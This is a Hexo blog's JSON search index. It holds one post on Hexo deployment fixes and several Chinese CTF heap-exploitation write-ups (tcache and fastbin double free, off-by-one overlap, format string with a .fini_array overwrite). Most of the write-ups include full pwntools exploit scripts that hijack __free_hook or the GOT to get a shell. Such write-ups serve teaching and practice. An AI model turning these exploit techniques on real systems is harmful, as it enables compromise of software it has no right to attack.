{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Eureka","url":"https://dawoxiansigema.github.io","root":"/"},"pages":[{"title":"categories","date":"2020-04-22T06:47:40.000Z","updated":"2023-10-31T12:59:20.571Z","comments":true,"path":"categories/index.html","permalink":"https://dawoxiansigema.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-04-24T07:40:24.000Z","updated":"2023-10-31T12:47:24.810Z","comments":true,"path":"tags/index.html","permalink":"https://dawoxiansigema.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Mac下Hexo踩坑记录","slug":"Mac下Hexo踩坑记录","date":"2023-11-01T03:14:51.000Z","updated":"2023-11-01T03:15:11.487Z","comments":true,"path":"2023/11/01/Mac下Hexo踩坑记录/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/Mac%E4%B8%8BHexo%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/","excerpt":"以下的总结写下来看似很简单 但是这一下午+一晚上的经历却是一段血泪史","text":"以下的总结写下来看似很简单 但是这一下午+一晚上的经历却是一段血泪史 Mac下Hexo踩坑记录插件安装建议用yarn 不要用npm 接近一半的报错都发生 12sudo npm install -g yarnyarn add package_name --save Error: Spawn failed改https为ssh方式 12345678910111213141516171819202122##进入站点根目录cd /usr/local/src/hexo/hanyubolg/##删除git提交内容文件夹vim _config.yml##修改deploy:type: gitrepo: &lt;https://github.com/yourname/yourname.github.io.git&gt; -&gt; git@github.com:a956551943/weixiaohui.github.io.gitbranch: master##最后hexo clean &amp;&amp; hexo g &amp;&amp; hexo dAuthor: CrazyJumsLink: &lt;https://jums.club/hexo-Error-Spawn-failed/#2-%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F1%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%89&gt;Source: CrazyJumsCopyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source. YAMLExceptionmd文件在Typora中修改过(编码不正常) 使用IDEA打开进行修改(这个坑掉进去好久爬不上来)","categories":[{"name":"Fix","slug":"Fix","permalink":"https://dawoxiansigema.github.io/categories/Fix/"}],"tags":[]},{"title":"(Tcache)ACTF_2019_message","slug":"ACTF-2019-message","date":"2023-11-01T03:09:04.000Z","updated":"2023-11-01T03:12:07.576Z","comments":true,"path":"2023/11/01/ACTF-2019-message/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/ACTF-2019-message/","excerpt":"常规Tcache利用","text":"常规Tcache利用 [Tcache]ACTF_2019_message12apple@ubuntu ~/Desktop&gt; patchelf --set-rpath /home/apple/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ ACTF_2019_messageapple@ubuntu ~/Desktop&gt; patchelf --set-interpreter /home/apple/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so ACTF_2019_message 审计不多嗦了 没溢出点 只有UAF漏洞在 1234567891011121314151617181920212223242526272829unsigned __int64 Delete()&#123; int v1; // [rsp+Ch] [rbp-24h] char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); if ( dword_60204C &lt;= 0 ) &#123; puts(&quot;There is no message in system&quot;); &#125; else &#123; puts(&quot;Please input index of message you want to delete:&quot;); read(0, &amp;buf, 8uLL); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Index is invalid!&quot;); &#125; else &#123; free(*(void **)&amp;dword_602060[4 * v1 + 2]); dword_602060[4 * v1] = 0; --dword_60204C; &#125; &#125; return __readfsqword(0x28u) ^ v3;&#125; 最开始还看错了 Del函数中删除的只有idx里的数组长度 而并没有删除 而环境是Ubuntu 18的 那么针对不同版本的glibc有不同的办法 GLIBC 2.27-3ubuntu1对于这个及以下版本而言 Tcache的检查及其不严格 可以直接使用Tcache dup 直接double free就行了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *context.log_level = &#x27;debug&#x27;sh = process(&#x27;./ACTF_2019_message&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;,27384)libc = ELF(&#x27;./libc-2.27.so&#x27;)def Add(len, content): sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Please input the length of message:&#x27;) sh.sendline(str(len)) sh.recvuntil(&#x27;Please input the message:&#x27;) sh.sendline(content)def Del(idx): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Please input index of message you want to delete:&#x27;) sh.sendline(str(idx))def Edit(idx, content): sh.sendlin(&#x27;3&#x27;) sh.recvuntil(&#x27;Please input index of message you want to edit:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;Now you can edit the message:&#x27;) sh.sendline(content)def Show(idx): sh.sendline(&#x27;4&#x27;) sh.recvuntil(&#x27;Please input index of message you want to display:&#x27;) sh.sendline(str(idx))gdb.attach(sh)Add(0x20, &#x27;aaaa&#x27;)Add(0x500, &#x27;cccccccc&#x27;)Add(0x20, &#x27;/bin/sh\\\\x00&#x27;)Del(1)Add(0x500, &#x27;cccccccc&#x27;)Show(3)leak_addr = u64(sh.recvuntil(&#x27;\\\\x7f&#x27;)[-6:].ljust(8,&#x27;\\\\0&#x27;))log.success(&#x27;leak_addr :&#x27; + str(hex(leak_addr)))libc_base = leak_addr - 0x3EBC0Alog.success(&#x27;libc_base :&#x27; + str(hex(libc_base)))free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]log.success(&#x27;free_hook :&#x27; + str(hex(free_hook)))system_addr = libc_base + libc.sym[&#x27;system&#x27;]log.success(&#x27;system_addr :&#x27; + str(hex(system_addr)))Del(0)Del(0)Add(0x20, p64(free_hook))Add(0x20, &#x27;aaaa&#x27;)Add(0x20, p64(system_addr))Del(2)sh.interactive() 注意一下 对于整个程序而言 只要free_hook的地址内有system 那么只要是该程序进行free操作时 都将调用system 此时只要free了&#x2F;bin&#x2F;sh\\x00即可 就相当于是个简化版的fastbin的double free","categories":[{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"}],"tags":[]},{"title":"(Fastbin)metasequoia_2020_samsara","slug":"metasequoia-2020-samsara","date":"2023-11-01T03:06:40.000Z","updated":"2023-11-01T03:11:02.312Z","comments":true,"path":"2023/11/01/metasequoia-2020-samsara/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/metasequoia-2020-samsara/","excerpt":"总算遇到一个简单的堆知识点了 fastbin的double free","text":"总算遇到一个简单的堆知识点了 fastbin的double free [Fastbin]metasequoia_2020_samsara审计1234567// 1. Capture a human// 2. Eat a human// 3. Cook a human// 4. Find your lair// 5. Move to another kingdom// 6. Commit suicide// choice &gt; 源码我就不放了 很简洁的菜单 总共6个功能 其中要通过前5个来构造堆结构 从而满足第6个功能 拿到flag 123456case 2u: puts(&quot;Index:&quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v5); free(index[v5]); puts(&quot;Eaten.&quot;); continue; 而此题与之前做的堆题不一样 此题并没有堆溢出点 无法off_by_one 纯粹是利用free时没有清空对应的堆指针 从而引发的fastbin attack 构造对于double free的话 需要构造的内容很少 只需要构造出一个循环的fastbin链表即可 12345678910Create()Create()Dele(0)Dele(1)Dele(0)arena ---&gt; chunk0 ---&gt; chunk1 ---&gt; chunk0gdb-peda$ heapinfo(0x20) fastbin[0]: 0x560c37e10010 --&gt; 0x560c37e10030 --&gt; 0x560c37e10010 (overlap chunk with 0x560c37e10010(freed) ) 可以看到我们的chunk0是0x560c37e10010 chunk1是0x560c37e10030 peda也检测到了double free 接下来要做的是修改chunk0中的fd指针 将其定位到v8附近 123456789101112Create() //chunk0Create() //chunk1Del(0)Del(1)Del(0)Create() //chunk2pause()gdb-peda$ heapinfo(0x20) fastbin[0]: 0x55f313e19030 --&gt; 0x55f313e19010 --&gt; 0x55f313e19030 (overlap chunk with 0x55f313e19030(freed) ) 对于目前的fastbin而言 是循环链表 我们进行malloc的话可以申请到相应的堆并修改其中内容 但是这个链表却不会被打破 他只会改变一下顺序 并且对于分配的chunk而言 123gdb-peda$ x/8gx 0x000055f3132d6000 + 0x2020400x55f3134d8040: 0x000055f313e19020 0x000055f313e190400x55f3134d8050: 0x000055f313e19020 0x0000000000000000 上方的code代表的是index存储的chunk地址 可以看到与fastbin相对应的地址 下一步需要做的就是打破循环链栈 链接fake chunk 123456789leak_addr = 0Show()leak_addr = sh.recv()[:14]log.success(&#x27;v7_addr :&#x27; + leak_addr)v7_addr = int(leak_addr, 16)v8_addr = hex(v7_addr + 0x8)log.success(&#x27;v8_addr :&#x27; + str(v8_addr))Edit(2, (v7_addr - 0x8)) 为啥是v7_addr - 0x8捏 我们链接的fake_chunk地址应该是chunk的头部 或者说起始地址 他相比v8_addr来说 低了0x10 而v7_addr又比v8_addr低了0x8 于是现在的链表就应该是这样的 1234#多次调试 地址会有所偏差chunk1 ---&gt; chunk0 ---&gt; fake_chunkgdb-peda$ heapinfo(0x20) fastbin[0]: 0x55d4aea56030 --&gt; 0x55d4aea56010 --&gt; 0x7ffca173ade0 --&gt; 0x0 可以说在栈上伪造一个堆空间 虽然这个堆空间用heap&#x2F;praseheap查不到(因为地址所限) 但是因为他链接在了fastbin的链表里 我们可以通过malloc来获取并修改他 现在还有3个chunk Create然后Edit 最后Commit即可 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *sh = process(&#x27;./metasequoia_2020_samsara&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;, 29825)context.log_level = &#x27;debug&#x27;def Create(): sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Captured.&#x27;)def Del(idx): sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Index:&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;Eaten&#x27;)def Edit(idx, payload): sh.sendline(&#x27;3&#x27;) sh.recvuntil(&#x27;Index:\\\\n&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;Ingredient:\\\\n&#x27;) sh.sendline(str(payload))def Show(): sh.sendline(&#x27;4&#x27;) sh.recvuntil(&#x27;Your lair is at: &#x27;)def Move(size): sh.sendline(&#x27;5&#x27;) sh.recvuntil(&#x27;Which kingdom?\\\\n&#x27;) sh.sendline(str(size))gdb.attach(sh)#sleep(3)Create() Create()Del(0)Del(1)Del(0)leak_addr = 0Show()leak_addr = sh.recv()[:14]log.success(&#x27;v7_addr :&#x27; + leak_addr)v7_addr = int(leak_addr, 16)v8_addr = hex(v7_addr + 0x8)log.success(&#x27;v8_addr :&#x27; + str(v8_addr))Move(0x20)Create()Edit(2, (v7_addr - 0x8))Create()Create()Create()Edit(5, str(3735928559))sh.sendline(&#x27;6&#x27;)sh.interactive()","categories":[{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"}],"tags":[]},{"title":"(堆重叠)npuctf_2020_easy_heap","slug":"npuctf-2020-easy-heap","date":"2023-11-01T03:05:11.000Z","updated":"2023-11-01T03:10:53.576Z","comments":true,"path":"2023/11/01/npuctf-2020-easy-heap/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/npuctf-2020-easy-heap/","excerpt":"还是太菜了 不过啥时候mac版本的ida能够更新一下 确实新题得连蒙带猜了","text":"还是太菜了 不过啥时候mac版本的ida能够更新一下 确实新题得连蒙带猜了 [堆重叠]npuctf_2020_easy_heap审计1234567891011121314151617181920212223242526unsigned __int64 edit()&#123; __int64 v1; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, (char *)&amp;v1 + 4, 4uLL); LODWORD(v1) = atoi((const char *)&amp;v1 + 4); if ( (signed int)v1 &lt; 0 || (signed int)v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( heaparray[(signed int)v1] ) &#123; printf(&quot;Content: &quot;, (char *)&amp;v1 + 4, v1); read_input((void *)heaparray[(signed int)v1][1], *heaparray[(signed int)v1] + 1LL); puts(&quot;Done!&quot;); &#125; else &#123; puts(&quot;How Dare you!&quot;); &#125; return __readfsqword(0x28u) ^ v2;&#125; 这是edit子函数中的代码 与之前的b00ks那题相比 这题的off_by_one就直接多了 直接暴力的多读取一个字符 所以我们在edit时可以造成堆溢出的 不过堆溢出构造堆时 都是调试着构造的 1234567891011121314151617181920def create(size,content): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Size of Heap(0x10 or 0x20 only) :&#x27;) #题目的create函数有误 这里应该是0x18 or 0x38 sh.sendline(str(size)) sh.recvuntil(&#x27;Content:&#x27;) sh.sendline(content)def edit(idx,content): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Index :&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;Content:&#x27;) sh.sendline(content)create(0x18,&#x27;aaaa&#x27;)create(0x18,&#x27;bbbb&#x27;)create(0x18,&#x27;/bin/sh\\\\x00&#x27;) 先试一下 不行再调嘛 是因为我的ida版本比较低 所以静态分析时会看的比较难受 就调试着看啦 我们申请了3个结构体 查看堆结构 1234567891011121314151617181920212223242526272829303132333435363738pwndbg&gt; heapAllocated chunk | PREV_INUSE &lt;---heap0_node(存储结构体0大小与内容地址指针)Addr: 0x140f000Size: 0x21Allocated chunk | PREV_INUSE &lt;---heap0_content(存储结构体0内容)Addr: 0x140f020Size: 0x21Allocated chunk | PREV_INUSE &lt;---heap1_node(存储结构体0大小与内容地址指针)Addr: 0x140f040Size: 0x21Allocated chunk | PREV_INUSE &lt;---heap1_content(存储结构体0内容) 后同理Addr: 0x140f060Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x140f080Size: 0x21Allocated chunk | PREV_INUSEAddr: 0x140f0a0Size: 0x21Top chunk | PREV_INUSEAddr: 0x140f0c0Size: 0x20f41pwndbg&gt; x/20gx 0x140f000 0x140f000: 0x0000000000000000 0x00000000000000210x140f010: 0x0000000000000018 0x000000000140f030 &lt;--- 对应aaaa内容地址 0x18为长度0x140f020: 0x0000000000000000 0x00000000000000210x140f030: 0x0000000a61616161 0x00000000000000000x140f040: 0x0000000000000000 0x00000000000000210x140f050: 0x0000000000000018 0x000000000140f070 &lt;--- 对应bbbb内容地址0x140f060: 0x0000000000000000 0x00000000000000210x140f070: 0x0000000a62626262 0x0000000000000000 边调试边看的 确实ida版本低了难受 好在这题代码比较简单 这回我们想到之前edit函数的堆溢出漏洞 如果我们edit(0) 控制长度为0x18 并且却输入0x18个a加上一个\\x41 那么就可以将下一个堆块头部长度覆盖为0x41 从而实现overlapping 堆重叠ctf里这种node和content两个堆的题目 可以采用直接伪造 也可以像这题一样通过overlapping实现二者互换 1234567891011121314create(0x18,&#x27;aaaa&#x27;)create(0x18,&#x27;bbbb&#x27;)create(0x18,&#x27;/bin/sh\\\\x00&#x27;)payload = &#x27;a&#x27; * 0x18 + &#x27;\\\\x41&#x27;edit(0,payload)dele(1)pwndbg&gt; binsfastbins0x20: 0x228d060 ◂— 0x00x30: 0x00x40: 0x228d040 ◂— 0x00x50: 0x0 那我们申请一个比0x40小一点的堆 比如0x38 那么malloc会首先调用0x20这个fastbin 用来创建node 而后content的话再调用0x40的 1234567891011121314151617181920212223242526pwndbg&gt; x/40gx 0x2086000--------------------- heap0------------------------0x2086000: 0x0000000000000000 0x0000000000000021 0x2086010: 0x0000000000000018 0x0000000002086030 0x2086020: 0x0000000000000000 0x0000000000000021 0x2086030: 0x6161616161616161 0x6161616161616161 --------------------- heap0--------------------------------------------- heap1------------------------0x2086040: 0x6161616161616161 0x0000000000000041 &lt;--- heap1_content 0x2086050: 0x6161616161616161 0x61616161616161610x2086060: 0x0000000000000000 0x00000000000000210x2086070: 0x0000000000000100 0x0000000000602018--------------------- heap2------------------------0x2086080: 0x000000000000000a 0x0000000000000021 &lt;--- heap1_node &amp; heap2_node0x2086090: 0x0000000000000018 0x00000000020860b0--------------------- heap1------------------------0x20860a0: 0x0000000000000000 0x0000000000000021 &lt;--- heap2_content0x20860b0: 0x0068732f6e69622f 0x000000000000000a--------------------- heap2------------------------0x20860c0: 0x0000000000000000 0x0000000000020f410x20860d0: 0x0000000000000000 0x00000000000000000x20860e0: 0x0000000000000000 0x00000000000000000x20860f0: 0x0000000000000000 0x0000000000000000heap1_node与heap2_node完全重叠在了一起 heap1_content也包含住了heap1_node与heap2_nodeheap1的node与content相当于反了过来 可以结合fastbin看 太绕了 下次要画图了之前申请的第二个heap组加起来一共就0x40 那我这一申请了0x20+0x40总共0x60 所以其实申请的heap_content是包含了heap_node 相当于重叠在了一起 于是我们如果修改heap_content的话就可以修改到heap_node 进而使用show时打印node就可以获取地址了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;sh = process(&#x27;./npuctf_2020_easyheap&#x27;)#sh = remote(&#x27;node4.buuoj.cn&#x27;,28997)elf = ELF(&#x27;./npuctf_2020_easyheap&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)def create(size,content): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;1&#x27;) sh.recvuntil(&#x27;Size of Heap(0x10 or 0x20 only) :&#x27;) sh.sendline(str(size)) sh.recvuntil(&#x27;Content:&#x27;) sh.sendline(content)def dele(idx): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;4&#x27;) sh.recvuntil(&#x27;Index :&#x27;) sh.sendline(str(idx))def edit(idx,content): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;2&#x27;) sh.recvuntil(&#x27;Index :&#x27;) sh.sendline(str(idx)) sh.recvuntil(&#x27;Content:&#x27;) sh.sendline(content)def show(idx): sh.recvuntil(&#x27;Your choice :&#x27;) sh.sendline(&#x27;3&#x27;) sh.recvuntil(&#x27;Index :&#x27;) sh.sendline(str(idx))gdb.attach(sh)create(0x18,&#x27;aaaa&#x27;)create(0x18,&#x27;bbbb&#x27;)create(0x18,&#x27;/bin/sh\\\\x00&#x27;)payload = &#x27;a&#x27; * 0x18 + &#x27;\\\\x41&#x27;edit(0,payload)dele(1)#pause()payload=&#x27;a&#x27;*0x10+p64(0)+p64(0x21)+p64(0x100)+p64(elf.got[&#x27;free&#x27;])create(0x38,payload)pause()show(1)sh.recvuntil(&#x27;Content : &#x27;)free_got = u64(sh.recv(6).ljust(8,&#x27;\\\\0&#x27;))print hex(free_got)libc_base = free_got - libc.sym[&#x27;free&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]#pause()print hex(system)edit(1,p64(system))#pause()dele(2)sh.interactive() 由于此题的保护情况 我们的got表可以进行修改 所以不需要free_hook 并且这种一个node一个content结构的ctf题 一般edit修改的都是node地址所指向的内存地址 于是我们在create的时候放一个got表 edit的时候修改的就是got表内容了","categories":[{"name":"Heap","slug":"Heap","permalink":"https://dawoxiansigema.github.io/categories/Heap/"}],"tags":[]},{"title":"(堆拓展)2015_hacklu_bookstore","slug":"2015-hacklu-bookstore","date":"2023-11-01T03:03:01.000Z","updated":"2023-11-01T03:10:39.746Z","comments":true,"path":"2023/11/01/2015-hacklu-bookstore/","link":"","permalink":"https://dawoxiansigema.github.io/2023/11/01/2015-hacklu-bookstore/","excerpt":"为什么堆题的难度会这么大QAQ 我菜哭了啊","text":"为什么堆题的难度会这么大QAQ 我菜哭了啊 [堆拓展]2015 hacklu bookstore审计123456789101112131415161718192021222324252627282930313233343536first_order = (char *)malloc(0x80uLL);second_order = (char *)malloc(0x80uLL);dest = (char *)malloc(0x80uLL);fgets(&amp;s, 128, stdin); switch ( s ) &#123; case &#x27;1&#x27;: puts(&quot;Enter first order:&quot;); edit_order(first_order); strcpy(dest, &quot;Your order is submitted!\\\\n&quot;); goto LABEL_14; case &#x27;2&#x27;: puts(&quot;Enter second order:&quot;); edit_order(second_order); strcpy(dest, &quot;Your order is submitted!\\\\n&quot;); goto LABEL_14; case &#x27;3&#x27;: delete_order(first_order); goto LABEL_14; case &#x27;4&#x27;: delete_order(second_order); goto LABEL_14; case &#x27;5&#x27;: v5 = (char *)malloc(0x140uLL); if ( !v5 ) &#123; fwrite(&quot;Something failed!\\\\n&quot;, 1uLL, 0x12uLL, stderr); return 1LL; &#125; submit(v5, first_order, second_order); v4 = 1; break; default: goto LABEL_14; &#125; 一个比较常规的菜单 只让order两个 并且提供删除操作 并且malloc的大小在之前已经是固定了 edit函数里主要是字符串的读入 不过很明显 没有提供边界 可以一直读入 会造成堆溢出 12345678910111213unsigned __int64 __fastcall edit_order(char *a1)&#123; ... while ( v3 != &#x27;\\\\n&#x27; ) &#123; v3 = fgetc(stdin); idx = cnt++; a1[idx] = v3; &#125; a1[cnt - 1] = 0; return __readfsqword(0x28u) ^ v5;&#125; delete函数的话 也是很暴力的就free了堆 并没有对相应的fd bk指针进行置空 那么这个堆就有重复利用的机会了 1234567891011121314151617181920212223unsigned __int64 __fastcall submit(char *all, const char *order1, char *order2)&#123; const char *src; // ST08_8 unsigned __int64 v4; // ST28_8 size_t v5; // rax char *v6; // rax size_t v7; // rax src = order2; v4 = __readfsqword(0x28u); *(_QWORD *)all = &#x27;:1 redrO&#x27;; *((_WORD *)all + 4) = &#x27; &#x27;; v5 = strlen(order1); strncat(all, order1, v5); v6 = &amp;all[strlen(all)]; *(_QWORD *)v6 = &#x27;2 redrO\\\\n&#x27;; *((_WORD *)v6 + 4) = &#x27; :&#x27;; v6[10] = 0; v7 = strlen(src); strncat(all, src, v7); *(_WORD *)&amp;all[strlen(all)] = &#x27;\\\\n&#x27;; return __readfsqword(0x28u) ^ v4;&#125; submit函数做的就是将order1和order2的内容都复制到自己申请的一个堆空间中 其实光看submit倒是没啥问题 具体利用后面再说 后面看到了printf(dest)这一很明显的fmt漏洞 12345678first_order = (char *)malloc(0x80uLL);second_order = (char *)malloc(0x80uLL);dest = (char *)malloc(0x80uLL);case &#x27;2&#x27;: puts(&quot;Enter second order:&quot;); edit_order(second_order); strcpy(dest, &quot;Your order is submitted!\\\\n&quot;); goto LABEL_14; first second dest三个应该是连在一起的堆 在second堆进行直接溢出覆盖dest的想法很好 可是我们写入了之后会被固定字符给覆盖 是有先后顺序的 不过如果我们能够通过first堆的溢出 修改second堆大小 这样进行UAF之后 malloc会先使用我们的unsorted bin 那么通过构造堆的方式 也许可以实现对dest的控制 这里的0x80是分析有误 实际上是0x90 submit堆也是一样 构造我们是要利用dest堆 不能直接用second堆 只能用后面的submit堆 那么我们必须要构造出一个0x150的bin给他用 可以用first的堆进行溢出 溢出到second的堆中进行大小的修改 123456789101112131415161718del2()payload = &#x27;A&#x27; * 0x88 + p64(0x151)order1(payload)pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x12ab000Size: 0x91Free chunk (unsortedbin) | PREV_INUSEAddr: 0x12ab090Size: 0x151fd: 0x7f2720272b00bk: 0x7f2720272b78Allocated chunk | IS_MMAPEDAddr: 0x12ab1e0Size: 0x6920746f6e206572 这样即可达到构造一个0x150堆的目的 构造之后我们submit即可将该unsorted bin激活 构造出一个重叠的堆空间 先看一下submit函数 1234567891011121314151617181920212223unsigned __int64 __fastcall submit(char *all, const char *order1, char *order2)&#123; const char *src; // ST08_8 unsigned __int64 v4; // ST28_8 size_t v5; // rax char *v6; // rax size_t v7; // rax src = order2; v4 = __readfsqword(0x28u); *(_QWORD *)all = &#x27;:1 redrO&#x27;; *((_WORD *)all + 4) = &#x27; &#x27;; v5 = strlen(order1); strncat(all, order1, v5); v6 = &amp;all[strlen(all)]; *(_QWORD *)v6 = &#x27;2 redrO\\\\n&#x27;; *((_WORD *)v6 + 4) = &#x27; :&#x27;; v6[10] = 0; v7 = strlen(src); strncat(all, src, v7); *(_WORD *)&amp;all[strlen(all)] = &#x27;\\\\n&#x27;; return __readfsqword(0x28u) ^ v4;&#125; *all是那个0x150的堆 后续称它为submit堆 submit函数会将order1与order2的数据一并写入到submit堆中 并且会在前方加上一些固定字符 先看一下我们的目标吧 123456789101112131415161718192021pwndbg&gt; x/40gx 0x6020000x602000: 0x0000000000000000 0x0000000000000091 &lt;--- first堆0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000000151 &lt;--- submit堆（padding我省略了）0x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x00000000000000000x6020c0: 0x0000000000000000 0x00000000000000000x6020d0: 0x0000000000000000 0x00000000000000000x6020e0: 0x0000000000000000 0x00000000000000000x6020f0: 0x0000000000000000 0x00000000000000000x602100: 0x0000000000000000 0x00000000000000000x602110: 0x0000000000000000 0x00000000000000000x602120: 0x0000000000000000 0x0000000000000091 &lt;--- dest堆0x602130: 0x0000000000000000 0x0000000000000000 我们的目的是0x602120处的字符可控 而这个0x602120地址其实是处于submit堆里面的 因此我们如果要构造此处的地址 就需要认真构造first堆内容 因为对于second堆而言 虽然已经释放了 但是指向second堆的指针还存储在栈上 1234567891011char *v5; // [rsp+8h] [rbp-B8h]char *first_order; // [rsp+18h] [rbp-A8h]char *second_order; // [rsp+20h] [rbp-A0h]char *dest; // [rsp+28h] [rbp-98h]char s; // [rsp+30h] [rbp-90h]unsigned __int64 v10; // [rsp+B8h] [rbp-8h]v10 = __readfsqword(0x28u);first_order = (char *)malloc(0x80uLL);second_order = (char *)malloc(0x80uLL);dest = (char *)malloc(0x80uLL); 所以指针还是指向原来的second堆地址 也就是现在的submt堆地址 因此 在submit时会将submit堆的内容再复制一遍 因此有以下关系 1submit堆内容 = &#x27;Order 1: &#x27; + first堆长度 + &#x27;\\\\nOrder 2: &#x27; + &#x27;Order 1: &#x27; + first堆长度 我们的目标地址距离submit头部有0x90的长度(其实就是原second堆大小) 为了简化计算 如果我们将first堆开头部分就设置为payload的话有 12first堆长度 + 0x1C(28个固定字符) = 0x90 (因为第二个first堆开头就是payload 所以不算第二个进去)first堆长度 = 0x74 不过 如果我们要覆盖到second堆头部存储长度的地址 需要0x88个字符 后来发现可以很巧妙的利用strlen()函数的00截断机制 成功让submit中判定为0x74个长度 1234567891011del2()payload = &#x27;@@%13$p@&#x27;payload += &#x27;A&#x27; * (0x74 - len(payload))payload += &#x27;\\\\x00&#x27; * 20 payload += &#x27;\\\\x51&#x27; + &#x27;\\\\x01&#x27;order1(payload)submit()sh.recvuntil(&#x27;@&#x27;) 成功利用fmt漏洞 回显已经输出栈上字符 至此可以说堆内容构造完成 半只脚打通了 二次利用程序在submit之后就停了 我们即使输出ret_addr或者libc_start_main地址都是徒劳 我们必须要让程序返回到main 程序内是有.fini_array段的 123456789101112.fini_array:00000000006011B8 ; ELF Termination Function Table.fini_array:00000000006011B8 ; ===========================================================================.fini_array:00000000006011B8.fini_array:00000000006011B8 ; Segment type: Pure data.fini_array:00000000006011B8 ; Segment permissions: Read/Write.fini_array:00000000006011B8 ; Segment alignment &#x27;qword&#x27; can not be represented in assembly.fini_array:00000000006011B8 _fini_array segment para public &#x27;DATA&#x27; use64.fini_array:00000000006011B8 assume cs:_fini_array.fini_array:00000000006011B8 ;org 6011B8h.fini_array:00000000006011B8 off_6011B8 dq offset sub_400830 ; DATA XREF: init+19↑o.fini_array:00000000006011B8 _fini_array ends.fini_array:00000000006011B8 我们可以利用 不过也只有一次机会 不过现在的关键是如何传入栈上 123456789while ( !v4 ) &#123; puts(&quot;1: Edit order 1&quot;); puts(&quot;2: Edit order 2&quot;); puts(&quot;3: Delete order 1&quot;); puts(&quot;4: Delete order 2&quot;); puts(&quot;5: Submit&quot;); fgets(&amp;s, 128, stdin); switch ( s ) 我实在是没想到还能这么传入 这个s直接给了0x80 因此在submit时可以把这个fini_array传入 123456789101112fini_array = 0x6011b8del2()payload = &#x27;%&#x27;+str(0xa39)+&#x27;c%13$hn&#x27;+&#x27;.%31$p&#x27;+ &#x27;,%28$p&#x27;payload += &#x27;A&#x27; * (0x74 - len(payload))payload += &#x27;\\\\x00&#x27; * 20 payload += &#x27;\\\\x51&#x27; + &#x27;\\\\x01&#x27;order1(payload)submit(&#x27;0000000&#x27; + p64(fini_array)) 这个%31$p是为了泄漏__libc_start_main函数地址 这个%28$p就更有意思了 12345678910111213141516171819202122232425262728pwndbg&gt; stack 3000:0000│ rsp 0x7ffd361b00c8 —▸ 0x400c7f ◂— mov rax, qword ptr [rbp - 0x98]01:0008│ 0x7ffd361b00d0 ◂— 0x1361b010102:0010│ 0x7ffd361b00d8 —▸ 0x224d0a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)03:0018│ 0x7ffd361b00e0 —▸ 0x400d38 ◂— pop rcx /* &#x27;Your order is submitted!\\\\n&#x27; */04:0020│ 0x7ffd361b00e8 —▸ 0x224d010 ◂— &#x27;%2617c%13$hn.%31$p,%28$pAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;05:0028│ 0x7ffd361b00f0 —▸ 0x224d0a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)06:0030│ 0x7ffd361b00f8 —▸ 0x224d130 ◂— 